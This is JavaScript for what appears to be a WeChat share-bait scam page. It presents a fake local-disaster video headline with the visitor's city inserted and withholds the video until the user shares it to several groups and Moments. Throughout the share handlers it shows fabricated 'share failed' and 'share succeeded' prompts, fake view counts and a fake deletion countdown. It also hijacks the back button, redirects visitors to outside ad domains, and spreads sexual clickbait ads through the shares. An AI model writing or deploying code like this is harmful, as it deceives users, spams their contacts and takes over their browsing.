var share_max_tl = 1;
var share_max_msg = 1;
var share_ii_tl = 0;
var share_ii_msg = 0;
var share_timeline = JSON.parse('[{"title":"\u592b\u59bb\u5e8a\u4e0a\uff0c\u5c04\u7cbe\u201c\u6027\u201d\u751f\u6d3b\u6280\u5de799%\u7684\u7537\u4eba\u4e0d\u77e5\u9053\u7684\u6280\u5de7\uff01","desc":"\u592b\u59bb\u5e8a\u4e0a\uff0c\u5c04\u7cbe\u201c\u6027\u201d\u751f\u6d3b\u6280\u5de799%\u7684\u7537\u4eba\u4e0d\u77e5\u9053\u7684\u6280\u5de7\uff01","link":"http:\/\/m969a582.rabbitpre.com\/d3hfdGltZWxpbmUtNDE=.do?fsrc=PBMBbj","imgUrl":"http:\/\/03sp1.xdexpress.cn\/Nb_yzadmin\/uploads\/1555685124-daea48dd-024f-418c-9ab6-7deac4a9cc50.png","qvid":0,"ad":true}]');
var share_message = JSON.parse('[{"title":"","desc":"\u592b\u59bb\u5e8a\u4e0a\uff0c\u5c04\u7cbe\u201c\u6027\u201d\u751f\u6d3b\u6280\u5de799%\u7684\u7537\u4eba\u4e0d\u77e5\u9053\u7684\u6280\u5de7\uff01","link":"http:\/\/m969a582.rabbitpre.com\/d3hfc2hhcmUtNDA=.do?fsrc=xaHHiX","imgUrl":"http:\/\/03sp1.xdexpress.cn\/Nb_yzadmin\/uploads\/1555685105-121807e1-1413-4fe5-a487-82d80e2b67bf.png","qvid":0,"ad":true}]');

function get_share_msg() {
    if (share_ii_msg == share_max_msg) {
        share_ii_msg = 0;
    }

    return share_message[share_ii_msg++];
}

function get_share_tl() {
    if (share_ii_tl == share_max_tl) {
        share_ii_tl = 0;
    }

    return share_timeline[share_ii_tl++];
}

function count_st(target, vid) {
    $.ajax({
        'type': "POST",
        'url': "/videos-api.php",
        'dataType': "json",
        'data': {
            target: target,
            vid: vid
        },
        'success': function (data) {
        }
    });
}

var city = '';
if (lo) {
    city = lc;
    if (city.length == 0) {
        city = lo;
    }
}
if (!city) {
    city = '';
}
city = city.replace('省', '');
city = city.replace('市', '');

var nowDate = new Date();
var hour = nowDate.getHours();
var miunte = nowDate.getMinutes();
miunte = miunte > 9 ? miunte : "0" + miunte;

/*//////////////// /////////////分享可变数组////////////////////////////// */
window.onload = function () {
    $("#tan").on("click",
        function () {
            var d = $('.weui-dialog');
            d.show(200);
        })
    var cover = '/demo/1557039682-ef95608c-0d59-4eda-940b-1c826b2815ff.jpeg';
    if ('' == cover) {
        cover = tvp.common.getVideoSnapMobile("h0867kciyhr");
    }

    var info = new tvp.VideoInfo();
    info.setVid("h0867kciyhr");
    var _player = new tvp.Player();
    _player.create({
        'video': info,
        'modId': "tvp_video",
        'width': $(document).width(),
        'height': "249",
        'player': 'auto',
        'autoplay': 0,
        'pic': cover,
        //'class':'video-fixed',
        'isHtml5ShowPosterOnEnd': true,
        'isHtml5ShowPlayBtnOnPause': true,
        'isiPhoneShowPosterOnPause': true,
        'isHtml5UseFakeFullScreen': false,
        'vodFlashSkin': "http://imgcache.qq.com/minivideo_v1/vd/res/skins/TencentPlayerMiniSkin.swf",
        'onallended': function () {
            if ('' != 'http://threefree.8ir57.cn/index.php?p=boy3') {
                window.location.href = 'http://threefree.8ir57.cn/index.php?p=boy3';
            }
        }
    });

    /* wxalert('点击播放按钮继续观看', '立即播放', function () {
         _player.setPlaytime('0');
         _player.play();

         count_st('wt_rside','h0867kciyhr');

         if('yes'==pvc){
             PVCH.onVW('188');
         }
     });*/

    if (!_player.paused) {
        //console.log(_player);
        setInterval(function () {
            if (_player.getPlaytime() > 252) {
                $("body").append('<a id="ts" style="display:none;" onclick="gogo();">ref</a>');
                document.getElementById('ts').click();
            }
        }, 1000);
    }
    var html = '<div class="rich_media_meta_list" style="margin-bottom:0;">'
        + '<em id="post-date" class="rich_media_meta rich_media_meta_text">2019-05-13</em>'
        + '<a class="rich_media_meta rich_media_meta_link rich_media_meta_nickname" style="color:#607fa6;" href="javascript:;" id="post-user">火爆视频</a>'
        + '</div>';
    var page_title = '[地区]今天中午11点39分发生，现场十分惨烈，场面壮观！';

    $('#play_ar').prepend(html);
    $("#play_ar").prepend('<div class="video_div"><h3 id="video_title">' + page_title.replace("[地区]", city) + '</h3></div>');
    $(document).attr('title', page_title.replace("[地区]", city));

}

alertTimes = 0;

function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3Cdiv%20id%3D%22lly_dialog%22%20style%3D%22display%3A%20none%22%3E%0A%20%20%20%20%0A%20%20%20%20%3Cdiv%20class%3D%22weui-dialog%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22weui-dialog__bd%22%20id%3D%22lly_dialog_msg%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22weui-dialog__ft%22%20style%3D%22background-color%3A%20%23e2c291%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3A%3B%22%20class%3D%22weui-dialog__btn%20weui-dialog__btn_primary%22%20id%3D%22lly_dialog_btn%22%20style%3D%22color%3A%20%23ffffff%3B%22%3E%3C/a%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%3C/div%3E");
        $("body").append(dialog)
    }
    alertTimes++;

    var d = $('.weui-dialog');
    var e = $('#lly_dialog');
    e.show(200);
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function () {
        d.hide(200);
        if (callback) {
            callback()
        }
    });
}

function showtip() {
    load();
    wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><br><b style="font-size:18px;color:#842020;">拍摄不易</b><br>请分享到<b style="color: red;">朋友圈</b>以示鼓励,并可继续观看', "确定", function () {
        $("#tan").show();
        $(".tvp_container").hide();
        $("#gongao").hide();
        $("#center").hide();

        $("#tan-bg").show();
        $('body').height($(window).height()).css('overflow', 'hidden');
        //setTimeout(' load()', 1);
        $('.clickme.topnav').hide();
        // $('.asd.clickme.topnav').show();

    });
}

//var wxshare_first_once='timeline';
var wxshare_first_once = 'timeline';
var wx_timeline_first = '';
var max_msg = 5, promt_msg = 2, max_tl = 2, promt_tl = 1;
var shareATimes_fixed = 1, share_times_msg = 1;
var shareTTimes_fixed = 1, share_times_tl = 1;
var shareATimes = 0;
var shareTTimes = 0;
var count_done = 0;

function share_tip(share_app_times, share_timeline_times) {
    if (0 == count_done) {
        count_st('wt_lside', 'h0867kciyhr');
        count_done = 1;
    }
    if ('yes' == wx_timeline_first) {
        return share_tip_tlf(share_app_times, share_timeline_times);
    }
    if (shareATimes_fixed < max_msg) {
        wx_share_change();
        /*if(share_app_times == 1){
            wxalert('<b style="font-size: 22px;color:green">分享失败！</b><br>分享人数大于<b style="font-size: 18px;color: red">'+50+'</b>个<b style="font-size: 18px;color: red">人的微信群！</b>！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');    
        } 
        if(share_app_times == 2){
           wxalert('<b style="font-size: 22px;color:green">分享失败！</b><br>请继续分享到<b style="font-size: 18px;color: red">'+2+'</b>个<b style="font-size: 18px;color: red">微信群</b>！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');   
        }*/

        if (share_app_times == 1) {
            wxalert('<b style="font-size: 22px;color:red">分享失败！</b><br><br>请不要分享给<b style="font-size: 18px;color: red">好友</b><br><b style="font-size: 22px;color: red;">请重心继续分享到群</b>', '确定');
        }
        if (share_app_times == 2) {
            wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br><br>仅需要再分享到<b style="font-size: 18px;color: red">' + 2 + '</b>个不同的群<br><b style="font-size: 22px;color: red;">即可继续观看</b>！', '确定');
            shareATimes_fixed = shareATimes_fixed - 1;
        }
        if (share_app_times == 3) {
            wxalert('<b style="font-size: 22px;color:red">分享失败！</b><br>请不要分享到<b style="font-size: 18px;color: red">相同的群或好友</b><br>请尝试重心分享到不同的群<br>即可马上观看！', '确定');
        }
        if (share_app_times == 4) {
            wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br><br>您仅需要再分享到<b style="font-size: 18px;color: red">一个不同的群</b><br>即可马上观看！', '确定');

        }
        if (share_app_times == 5) {
            wxalert('<b style="font-size: 22px;color:red">分享失败！</b><br>请不要分享到<b style="font-size: 18px;color: red">小于50人的群聊</b><br>请尝试重新分享到大于50人的群聊<br>即可马上观看！', '确定');
        }
        shareATimes_fixed++;
        /*                         
        if (share_app_times == promt_msg){
             //wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br>请继续分享到<b style="font-size: 18px;color: red">'+(max_msg-promt_msg+1)+'</b>个<b style="font-size: 18px;color: red">微信群</b>！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
                                    wxalert('<b style="font-size: 22px;color:green">1分享成功！</b><br>请继续分享到<b style="font-size: 18px;color: red">'+3+'</b>个<b style="font-size: 18px;color: red">微信群</b>！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
        }else{
            if(share_app_times<promt_msg){
     			var num_t=max_msg - share_app_times;
			}
			else {
				var num_t=max_msg - shareATimes_fixed;
				if(0==num_t){
					num_t=1;
				}
			}
 			wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">' + (num_t)  + '</b>个微信群！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
 			//wxalert('<b style="font-size: 22px;color:green">分享失败！</b><br/>请重新分享到<b style="font-size: 18px;color: red">' + (num_t)  + '</b>个<b style="font-size: 18px;color: red;">不同的</b>微信群！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
			shareATimes_fixed++;
        }
        */

    } else {
        wx.hideOptionMenu();
        wx.showMenuItems({menuList: ['menuItem:share:timeline']});

        if (0 == share_timeline_times) {
            //wxalert('分享成功，剩下最后一步啦！<br />请分享到<br /><span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>!', '好');
            $('#tan').css('background-image', 'url(images/quan-tan-ok.png)');
        }

        configReload();
        if (shareTTimes_fixed <= max_tl) {
            if (share_timeline_times == promt_tl) {
                wxalert('<span style="font-size: 30px;color:green">分享失败</span><br>必须公开分享，请再次分享到<br/><span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">继续观看</b>!', '好');
                shareTTimes_fixed++;
                /*分享朋友圈的规则和群发的不一样，即使失败也增加次数。所以，else的情况需要-1修正显示数字*/
            }
            else {
                if (share_timeline_times < promt_tl) {
                    var num_t = max_tl - share_timeline_times - 1;
                }
                else {
                    var num_t = max_tl - shareTTimes_fixed - 1;
                }
                if (0 >= num_t) {
                    num_t = 1;
                }
                //wxalert('<span style="font-size: 30px;color: #f5294c">分享成功</span><br>再分享'+(num_t) +'次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>!', '好');
                wxalert('<span style="font-size: 30px;color: green">分享成功</span><br><br>还剩<b style="font-size: 18px;color: red;">最后一步啦</b><br>请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span><br>保证<b style="font-size: 18px;color: red;">100%</b>立即观看!', '确定');
                shareTTimes_fixed++;
            }
        }
        else {
            //wxalert("<b style='color:green'>分享成功</b>，请点击继续进行观看!", "点击继续观看", function () {
            top.location.href = '188-2.html?fsrc=Q0Quua';
            //}); 
        }
    }
}

function share_tip_tlf(share_app_times, share_timeline_times) {
    if (shareTTimes_fixed < max_tl) {
        if (share_timeline_times == promt_tl && 1 < max_tl) {
            wxalert('<span style="font-size: 30px;color:green">分享失败</span><br>必须公开分享，请再次分享到<br/><span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">继续观看</b>!', '好');
            shareTTimes_fixed++;
            /*分享朋友圈的规则和群发的不一样，即使失败也增加次数。所以，else的情况需要-1修正显示数字*/
        }
        else {
            if (share_timeline_times < promt_tl) {
                var num_t = max_tl - share_timeline_times - 1;
            }
            else {
                var num_t = max_tl - shareTTimes_fixed - 1;
                if (0 == num_t) {
                    num_t = 1;
                }
            }
            //wxalert('<span style="font-size: 30px;color: #f5294c">分享成功</span><br>再分享'+(num_t)+'次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>!', '好');
            wxalert('<span style="font-size: 30px;color: #f5294c">分享成功</span><br>再分享' + (num_t) + '次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>!', '好');
            shareTTimes_fixed++;
        }
        configReload();
    }
    else {
        wx.hideOptionMenu();
        wx.showMenuItems({'menuList': ['menuItem:share:appMessage']});
        $('#tan').css('background-image', 'url(/bg-20180828.jpeg)');

        if (1 == shareATimes_fixed) {
            wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">' + (max_msg) + '</b>个不同的群！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
        }

        if (shareATimes_fixed <= max_msg) {
            wx_share_change();
            if (share_app_times == promt_msg) {
                //wxalert('<b style="font-size: 22px;color:green">分享失败！</b><br>注意：分享到相同的群会失败！<br>请继续分享到<b style="font-size: 18px;color: red">'+(max_msg-promt_msg+1)+'</b>个不同的群！', '好');
                wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br>请继续分享到' + (max_msg - promt_msg + 1) + '个<b style="font-size: 18px;color: red">微信群</b>！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
            } else {
                if (share_app_times < promt_msg) {
                    var num_t = max_msg - share_app_times;
                }
                else {
                    var num_t = max_msg - shareATimes_fixed;
                }
                if (0 >= num_t) {
                    num_t = 1;
                }
                //wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">' + (num_t) + '</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
                wxalert('<b style="font-size: 22px;color:green">分享失败！</b><br/>请重新分享到' + (num_t) + '个<b style="font-size: 18px;color: red">不同的</b>微信群！<br>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
                shareATimes_fixed++;
            }
        }
        else {
            top.location.href = '188-2.html?fsrc=Q0Quua';
        }
    }
}

function share_tip_once(name) {
    if (0 == count_done) {
        count_st('wt_lside', 'h0867kciyhr');
        count_done = 1;
    }

    if ('yes' == wx_timeline_first) {
        wx.hideOptionMenu();
        wx.showMenuItems({menuList: ['menuItem:share:timeline']});
        $('#tan').css('background-image', 'url(images/quan-tan-ok.png)');
        wx_timeline_change();
        //wxalert('<span style="font-size: 30px;color: #f5294c">分享成功</span><br>请继续分享'+(max_tl)+'次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>!', '好');
        wxalert('<span style="font-size: 30px;color: #f5294c">分享成功</span><br>请继续分享' + (max_tl) + '次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可<b style="font-size: 18px;color: red;">免流量加速观看</b>!', '好');
    }
    else {
        wx.hideOptionMenu();
        wx.showMenuItems({'menuList': ['menuItem:share:appMessage']});
        $('#tan').css('background-image', 'url(/bg-20180828.jpeg)');
        wx_share_change();
        //wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">' + (max_msg) + '</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好');
        wxalert('<b style="font-size: 22px;color:green">分享成功！</b><br/><br/>您仅需分享到<b style="font-size: 18px;color: red">3个微信群</b><br><b style="font-size: 22px;color: red;">即可继续观看</b>', '确定');
    }
}

var title_end = '[地区]今天中午11点3\n9分发生，现场十分惨烈，场面壮观！';
title_end = title_end.replace("[时间]", hour + ':' + miunte);
title_end = title_end.replace("[地区]", city);
title_end = title_end.replace("[表]", '🎉');
title_end = title_end.replace(/[\r\n]/g, "");
//var special_title_end = '';
var special_title_end = '[地区]今天中午11点3\n9分发生，现场十分惨烈，场面壮观！';
special_title_end = special_title_end.replace("[地区]", city);
special_title_end = special_title_end.replace("[时间]", hour + ':' + miunte);
special_title_end = special_title_end.replace("[表]", '🎅');
special_title_end = special_title_end.replace(/[\r\n]/g, "");

function load() {
    $.ajax({
        'type': "GET",
        'url': "http://dnss.d47wb.cn/jssdk/wxshare.php?id=97&url=" + "http%3A%2F%2Fdnss.d47wb.cn%2FI8IxTRogYJ%40188.html%3F_t%3D1557718158",
        'dataType': "jsonp",
        'jsonp': "callback",
        'data': {},
        'success': function (data) {
            window.data = data;
            window.config = {
                'debug': false,
                'appId': window.data.appId,
                'timestamp': window.data.timestamp,
                'nonceStr': window.data.nonceStr,
                'signature': window.data.signature,
                'jsApiList': ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems"]
            };
            wx.config(window.config);

            wx.ready(function () {
                //	title='😠'+city+hour+':'+miunte +'';
                title = special_title_end;

                if ('timeline' == wxshare_first_once) {
                    //	title='🍉'+city+hour+':'+miunte +'[地区]今天中午11点3\n9分发生，现场十分惨烈，场面壮观！';
                    title = title_end;
                    wx.hideOptionMenu();
                    wx.showMenuItems({menuList: ['menuItem:share:timeline']});
                    $('#tan').css('background-image', 'url(images/quan-tan-ok.png)');
                }
                else if ('message' == wxshare_first_once) {
                    wx.hideOptionMenu();
                    wx.showMenuItems({'menuList': ['menuItem:share:appMessage']});
                }
                else {
                    if ('yes' == wx_timeline_first) {
                        wx.hideOptionMenu();
                        wx.showMenuItems({menuList: ['menuItem:share:timeline']});
                        $('#tan').css('background-image', 'url(images/quan-tan-ok.png)');
                    }
                    else {
                        wx.hideOptionMenu();
                        wx.showMenuItems({'menuList': ['menuItem:share:appMessage']});
                    }
                }

                wx.onMenuShareAppMessage({
                    //title:'👦'+city+hour+':'+miunte +'[地区]今天中午11点3\n9分发生，现场十分惨烈，场面壮观！',
                    //title:'🏀'+city+hour+':'+miunte +'',
                    title: title,
                    desc: '[地区]22818人看过，11.4w次播放'.replace("[地区]", city),
                    link: 'http://ma228a00.rabbitpre.com/188-1557718220.html?21MOjSdlUErEDIEfnfhASEwSyZJTGK4uxKZJ2Md99IBlheqV4D',
                    imgUrl: 'http://04sp3.xdexpress.cn/Nb_yzadmin/Public/uploads/1557039682-096d5785-92c9-4a9b-8f59-6939beaa3d18.jpeg',
                    // type: 'video',
                    success: function () {
                        if ('message' == wxshare_first_once) {
                            share_tip_once('message');
                            count_st('st_msg', 'h0867kciyhr');
                        }
                        else {
                            shareATimes += 1;
                            share_tip(shareATimes, shareTTimes);
                            count_st('st_msg', 'h0867kciyhr');
                        }
                    },
                    cancel: function () {

                    }
                });

                wx.onMenuShareTimeline({
                    //title: '😺'+city+hour+':'+miunte +'[地区]今天中午11点3\n9分发生，现场十分惨烈，场面壮观！',
                    //title: '🎉'+city+hour+':'+miunte +'',
                    title: title,
                    desc: '已有59385人正在观看！！' + '21' + '分钟后删除..',
                    imgUrl: 'http://04sp3.xdexpress.cn/Nb_yzadmin/Public/uploads/1557039682-096d5785-92c9-4a9b-8f59-6939beaa3d18.jpeg',
                    link: 'http://ma228a00.rabbitpre.com/188-1557718220.html?21MOjSdlUErEDIEfnfhASEwSyZJTGK4uxKZJ2Md99IBlheqV4D',
                    //type: 'video',
                    success: function () {
                        if ('timeline' == wxshare_first_once) {
                            count_st('st_tl', 'h0867kciyhr');
                            share_tip_once('timeline');
                        }
                        else {
                            shareTTimes += 1;
                            share_tip(shareATimes, shareTTimes);
                            count_st('st_tl', 'h0867kciyhr');
                        }
                    },
                    cancel: function () {

                    }
                });
            });
        }
    });
}

var special_title = '';
var special_done = 0;
if ('yes' == 'no') {
    special_title = '';
}

function wx_share_change() {
    wx.config(window.config);
    wx.ready(function () {
        wx.hideOptionMenu();
        wx.showMenuItems({'menuList': ['menuItem:share:appMessage']});
        if ((shareATimes == 2) && 'Array' != '') {
            /*//////////////// /////////////分享可变数组////////////////////////////// */
            var msg = get_share_msg();
            if ('' != '') {
                if (parseInt('') == shareATimes) {
                    msg.link = '';
                }
            }


        } else if ((shareATimes == 4) && 'Array' != '') {
            /*//////////////// /////////////分享可变数组////////////////////////////// */
            var msg = get_share_msg();
            if ('' != '') {
                if (parseInt('') == shareATimes) {
                    msg.link = '';
                }
            }


        }

        else {
            var msg = {
                title: title_end,
                desc: '[地区]22818人看过，11.4w次播放'.replace("[地区]", city),
                link: 'http://ma228a00.rabbitpre.com/188-1557718220.html?21MOjSdlUErEDIEfnfhASEwSyZJTGK4uxKZJ2Md99IBlheqV4D',
                imgUrl: 'http://04sp3.xdexpress.cn/Nb_yzadmin/Public/uploads/1557039682-096d5785-92c9-4a9b-8f59-6939beaa3d18.jpeg',
                qvid: 'h0867kciyhr'
                // type: 'video',
            };
        }

        //var now_title='🎅'+city+hour+':'+miunte +msg.title;
        var now_title = special_title_end;//全部特定标题
        if ('' != special_title) {
            if (1 > special_done && 0 < share_max_msg && Math.ceil(Math.random() * 10) % 2) {
                now_title = special_title;
                special_done = 1;
            }
            if (1 > special_done) {
                // 保证必须出现1次
                if (1 == max_msg
                    || (shareATimes_fixed == max_msg - 1)
                ) {
                    now_title = special_title;
                    special_been = 1;
                }
            }
        }

        //  var now_title='😜'+city+hour+':'+miunte +special_title;//全部特定标题
        if ((shareATimes == 2) && 'Array' != '') {
            var now_title = "";//
            // var now_title=special_title_end;//全部特定标题
        } else if ((shareATimes == 4) && 'Array' != '') {
            var now_title = "";//
            // var now_title=special_title_end;//全部特定标题
        } else {
            var now_title = special_title_end;//全部特定标题
        }
        wx.onMenuShareAppMessage({
            //title: '😰'+now_title,
            title: now_title,
            desc: msg.desc,
            link: msg.link,
            imgUrl: msg.imgUrl,
            //type: 'video',
            success: function () {
                shareATimes += 1;
                share_tip(shareATimes, shareTTimes);
                count_st('st_msg', msg.qvid);
            },
            cancel: function () {

            }
        });
    });
}

function wx_timeline_change() {
    configReload();
}

function configReload() {
    // 如果需要开启朋友圈广告，注释此return语句
    //return;

    // 分享朋友圈时分享广告的设置
    wx.config(window.config);
    wx.ready(function () {
        if (0 < shareTTimes) {
            /*//////////////// /////////////分享可变数组////////////////////////////// */
            var tl = get_share_tl();
            if ('' != '') {
                if (parseInt('') == shareTTimes) {
                    tl.link = '';
                }
            }
        }
        else {
            //var tl=get_share_tl();
            var tl = {
                title: title_end,
                desc: '[地区]22818人看过，11.4w次播放'.replace("[地区]", city),
                link: 'http://ma228a00.rabbitpre.com/188-1557718220.html?21MOjSdlUErEDIEfnfhASEwSyZJTGK4uxKZJ2Md99IBlheqV4D',
                imgUrl: 'http://04sp3.xdexpress.cn/Nb_yzadmin/Public/uploads/1557039682-096d5785-92c9-4a9b-8f59-6939beaa3d18.jpeg',
                qvid: 'h0867kciyhr'
                // type: 'video',
            };
        }
        //var tl=get_share_tl();
        var title = tl.title;
        //var title='😠'+city+hour+':'+miunte +tl.title;
        wx.onMenuShareTimeline({
            title: title.replace("[地区]", city),
            link: tl.link,
            desc: tl.desc,
            imgUrl: tl.imgUrl,
            type: 'video',
            success: function () {
                shareTTimes += 1;
                share_tip(shareATimes, shareTTimes);
                count_st('st_tl', 'h0867kciyhr');
            },
            cancel: function () {

            }
        });
    })
}

window.onhashchange = function () {
    //top.location.href=''+'?fsrc='+'RkTe8HcIMm8ffyEg';
    backurl();//后台返回
};

function back_url() {
    top.location.href = '' + '?fsrc=' + 'RkTe8HcIMm8ffyEg';
}

function gogo() {
    top.location.href = 'http://meb11aef.rabbitpre.com/188-1-97.html?fsrc=' + 'RkTe8HcIMm8ffyEg';
}


history.pushState(history.length + 1, "message", '#' + new Date().getTime());

function backurl() {
    var url_t = 'http://threefree.8ir57.cn/index.php?p=boy3';
    if ('' != url_t) {
        top.location.href = url_t;
    }
    else {
        top.location.href = '/0.html?fsrc=' + 'RkTe8HcIMm8ffyEg';
    }
}

$(document).ready(function () {
    $('.topnav.clickme').click(function () {
        backurl();
    });
    //$('#readNum').text('5156087+');
    $('#likeNum').text('8000');
    $('#like').click(function () {
        if ('1' == $(this).attr('data-like')) {
            var revoke = 'yes';
        }
        else {
            var revoke = 'no';
        }
        var icon = $(this);
        $.ajax({
            'type': "POST",
            'url': "/video-like.php",
            'dataType': "json",
            'data': {
                vid: 'h0867kciyhr'
                , revoke: revoke
            },
            'success': function (res) {
                if (1 == res.status) {
                    var count = parseInt($('#likeNum').text());
                    if ('yes' == revoke) {
                        icon.removeClass('praised');
                        icon.attr('data-like', '0');
                        count--;
                    }
                    else {
                        icon.addClass('praised');
                        icon.attr('data-like', '1');
                        count++;
                    }
                    $('#likeNum').text(count);
                }
                else {
                    wxalert('点赞失败', '好');
                }
            }
            , error: function (res) {
                wxalert('点赞失败 网络错误' + JSON.stringify(res), '好');
            }
        });
    });
});
document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
    // 通过下面这个API隐藏右上角按钮
    WeixinJSBridge.call('hideOptionMenu');
});